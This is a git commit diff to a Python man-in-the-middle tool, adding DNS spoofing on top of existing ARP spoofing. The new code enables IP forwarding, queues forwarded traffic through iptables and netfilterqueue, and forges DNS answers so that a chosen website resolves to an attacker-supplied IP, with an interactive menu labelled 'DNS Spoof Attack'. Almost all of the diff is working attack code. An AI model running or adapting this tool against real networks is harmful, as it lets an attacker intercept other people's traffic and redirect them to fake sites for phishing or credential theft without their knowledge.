6bcfe7cf0925acafb6746f6e1dacc2eaf1396748
pan0sSt <p.stavrinakis@gmail.com>
2020-10-25 15:41:36 -0400

    Added dns_spoof() & kill_dns()

--- main.py
+++ main.py
@@ -5,6 +5,8 @@ import re  # regular expressions
 import time  # use sleep() for delays
 import sys  # info about the os
 import multiprocessing
+import netfilterqueue  # provides access to packets matched by an iptables rule in Linux
+import subprocess
 
 
 # function that returns a list with responses from a broadcast
@@ -90,10 +92,22 @@ def restore(dst_ip, src_ip):
     scapy.send(packet, count=4, verbose=False)  # count: number of times to send
 
 
+# function that resets ARP tables and restores original connections
+def cleanup(targets, src):
+    for target_ip in targets:
+        if target_ip != router_ip:
+            restore(target_ip, src)
+            restore(src, target_ip)
+    print("[+] Done!")
+    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+        f.write("0")  # disable ip forwarding
+    global allow_arp
+    allow_arp = 1
+
+
 # function that creates a Man in the Middle
 def arp_spoof(targets, src):
     if SYS_PLATFORM == 'linux':
-        print('This is Linux OS')
         try:
             with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                 f.write("1")  # enable ip forwarding to allow flow of packets through machine
@@ -104,16 +118,78 @@ def arp_spoof(targets, src):
                         spoof(src, target_ip)
                 time.sleep(2)  # 2 seconds delay
         except Exception:
-            print("\n[!] Something went wrong ... Resetting ARP Tables...")
-            for target_ip in targets:
-                if target_ip != router_ip:
-                    restore(target_ip, src)
-                    restore(src, target_ip)
-            print("[+] Done!")
-            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-                f.write("0")  # disable ip forwarding
+            print("[!] Something went wrong ... Resetting ARP Tables...")
+            cleanup(targets, src)
     elif SYS_PLATFORM == 'win32':
         print('This is Windows OS')
+        print('Under Construction')
+
+
+# function that modifies DNS layer packets
+def process_packet(packet, target_website, modified_ip):
+    scapy_packet = scapy.IP(packet.get_payload())  # convert payload into a scapy packet
+    if scapy_packet.haslayer(scapy.DNSRR):  # check if packet has a dns response layer
+        qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")
+        if target_website in qname:
+            # create a dns response, keep the name, change the ip to the preferred one
+            answer = scapy.DNSRR(rrname=qname, rdata=modified_ip)
+            scapy_packet[scapy.DNS].an = answer  # modify the answer of the packet
+            scapy_packet[scapy.DNS].ancount = 1  # modify the number of answers of the packet
+
+            # remove variables that would corrupt the modified packet, scapy will auto redefine them
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+
+            packet.set_payload(bytes(scapy_packet))  # change the original payload of the packet with the modified one
+    packet.accept()  # allow forwarding the packet to it's destination
+
+
+# function that spoofs a DNS response
+def dns_spoof(target_website, modified_ip):
+    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
+    queue = netfilterqueue.NetfilterQueue()  # object creation
+    queue.bind(1,
+               lambda packet, target_website=target_website, modified_ip=modified_ip:
+               process_packet(packet, target_website, modified_ip)
+               )  # connect to an existed queue
+    try:
+        queue.run()
+    except Exception:
+        print("[!] Something went wrong ... FlUSHING IPTABLES...")
+        subprocess.run(["iptables", "--flush"])
+        print("[+] Done.")
+        global allow_dns
+        allow_dns = 1
+
+
+def kill_dns():
+    try:
+        if dns_process.is_alive():
+            dns_process.terminate()
+            print("[!] Dns process terminated ... FlUSHING IPTABLES...")
+            subprocess.run(["iptables", "--flush"])
+            print("[+] Done.")
+            global allow_dns
+            allow_dns = 1
+        else:
+            print('[-] No dns spoof running at the moment.')
+    except NameError:
+        print('[-] No dns spoof running at the moment.')
+
+
+def kill_arp():
+    try:
+        if arp_process.is_alive():
+            kill_dns()
+            arp_process.terminate()
+            print("[!] Arp process terminated ... Resetting ARP Tables...")
+            cleanup(selected, source)
+        else:
+            print('[-] No arp spoof running at the moment.')
+    except NameError:
+        print('[-] No arp spoof running at the moment.')
 
 
 ########################
@@ -121,10 +197,10 @@ def arp_spoof(targets, src):
 ########################
 SYS_PLATFORM = sys.platform  # os of the current machine
 command = ''  # command to be executed
-allow = 1  # flag that shows if an arp spoof is already running
+allow_arp = 1  # flag that shows if an arp spoof is already running
+allow_dns = 1  # flag that shows if a dns spoof is already running
 scan_result = []  # list of network IPs
 router_ip = scapy.conf.route.route("0.0.0.0")[2]  # Router's ip
-
 
 print('Welcome back Boss!')
 while True:
@@ -140,7 +216,7 @@ while True:
         scan_result = network_scanner()
 
     elif command == "arpspoof()":
-        if allow:
+        if allow_arp:
             if scan_result:
                 option = ''
                 while option != 'auto' and option != 'man':
@@ -155,15 +231,19 @@ while True:
                         target, source = ip_input(scan_result)
                     selected.append(target)
                     arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, source))
+                    print("[+] Initializing Arp Spoof...")
+                    time.sleep(0.1)
                     arp_process.start()
-                    allow = 0
+                    allow_arp = 0
                 elif option == 'auto':
                     if router_ip:
                         source = router_ip
                         selected = scan_result
                         arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, source))
+                        print("[+] Initializing Arp Spoof...")
+                        time.sleep(0.1)
                         arp_process.start()
-                        allow = 0
+                        allow_arp = 0
                     else:
                         print("[-] Router IP not found. Choose manually..")
                         time.sleep(0.1)
@@ -173,23 +253,29 @@ while True:
         else:
             print('[!] Arp spoof already running.')
 
-    elif command == 'killarp()':
-        try:
-            if arp_process.is_alive():
-                arp_process.terminate()
-                print("\n[!] Arp process terminated ... Resetting ARP Tables...")
-                for target_ip in selected:
-                    if target_ip != router_ip:
-                        restore(target_ip, source)
-                        restore(source, target_ip)
-                print("[+] Done!")
-                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-                    f.write("0")  # disable ip forwarding
-                allow = 1
-            else:
+    elif command == 'dnsspoof()':
+        if allow_dns:
+            try:
+                if arp_process.is_alive():
+                    target_website = input('Your target website: ')
+                    modified_ip = input('Your redirect IP: ')
+                    dns_process = multiprocessing.Process(target=dns_spoof, args=(target_website, modified_ip))
+                    print("[+] Initializing Dns Spoof...")
+                    time.sleep(0.1)
+                    dns_process.start()
+                    allow_dns = 0
+                else:
+                    print('[-] No arp spoof running at the moment.')
+            except NameError:
                 print('[-] No arp spoof running at the moment.')
-        except NameError:
-            print('[-] No arp spoof running at the moment.')
+        else:
+            print('[!] Dns spoof already running.')
+
+    elif command == 'killarp()':
+        kill_arp()
+
+    elif command == 'killdns()':
+        kill_dns()
 
     elif command == "help()":
         print("----------------------------------")
@@ -197,8 +283,10 @@ while True:
         print("----------------------------------")
         print("help()          Show commands")
         print("scan()          Network scanning")
-        print("arpspoof()      Manual or Auto MITM Attack")
-        print("killarp()       Kill process running MITM Attack")
+        print("arpspoof()      Manual or Auto Arp Spoof")
+        print("dnsspoof()      DNS Spoof Attack")
+        print("killarp()       Kill process running Arp Spoof")
+        print("killdns()       Kill process running Dns Spoof")
         print("exit()          Exit the app")
         print("----------------------------------")
 
